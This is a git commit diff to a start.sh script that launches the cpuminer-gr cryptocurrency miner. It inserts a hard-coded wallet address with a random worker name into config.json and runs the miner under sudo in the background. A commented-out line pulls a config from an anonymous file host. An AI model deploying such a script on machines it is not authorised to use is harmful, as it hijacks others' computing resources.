3718434e6e54f4129198c182e94cae4c456c613a
train-to-cupertino <49920253+train-to-cupertino@users.noreply.github.com>
2021-10-26 15:17:57 +0300

    [1.2.3] Fixed worker name

--- 1.2.3/start.sh
+++ 1.2.3/start.sh
@@ -8,7 +8,7 @@ cd ./cpuminer-gr-1.2.3-x86_64_linux
 #rm config.json
 #wget http://transfer.sh/oRGelS/config.json
 NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
-sed -i "s/RQKcAZBtsSacMUiGNnbk3h3KJAN94tstvt.WorkerName/RYKp42YigotaFCD8DKEtYafvJ1jpSS8CFr.Worker.$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)/" ./config.json
+sed -i "s/RQKcAZBtsSacMUiGNnbk3h3KJAN94tstvt.WorkerName/RYKp42YigotaFCD8DKEtYafvJ1jpSS8CFr.Worker$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)/" ./config.json
 chmod +x ./cpuminer.sh
 sudo ./cpuminer.sh > ~/m/log.txt &
 # tail -f ~/m/log.txt
